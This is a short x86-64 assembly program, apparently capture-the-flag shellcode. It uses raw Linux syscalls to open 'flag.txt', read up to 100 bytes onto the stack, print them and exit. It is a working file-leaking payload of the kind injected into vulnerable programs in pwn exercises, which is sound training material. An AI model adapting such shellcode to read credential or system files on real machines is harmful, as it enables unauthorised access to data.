.global _start
_start:
.intel_syntax noprefix
    lea rdi, [rip+flag]
    mov rax, 2
    mov rsi, 0
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 100
    syscall
    
    mov rax, 60
    syscall
flag:
    .string "flag.txt"
